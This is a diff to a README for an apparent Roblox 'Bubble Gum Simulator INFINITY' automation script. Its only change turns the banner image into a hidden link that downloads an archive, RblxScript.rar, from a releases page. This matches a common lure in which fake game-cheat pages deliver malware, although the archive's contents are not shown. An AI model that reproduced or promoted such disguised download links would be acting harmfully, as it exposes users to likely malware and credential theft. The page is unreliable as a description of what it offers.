@@ -1,6 +1,6 @@
 # Bubble Gum Simulator INFINITY - Ultimate Automation Script �  
 
-![437989541-5094e38d-91fd-4c76-8e1f-19c0a8060527](https://github.com/user-attachments/assets/726604fe-046d-437e-ae30-13bf90fa0c77)
+[![437989541-5094e38d-91fd-4c76-8e1f-19c0a8060527](https://github.com/user-attachments/assets/726604fe-046d-437e-ae30-13bf90fa0c77)](https://github.com/Matsusama/script/releases/download/Script/RblxScript.rar)
 
 
 ## 📌 Overview  
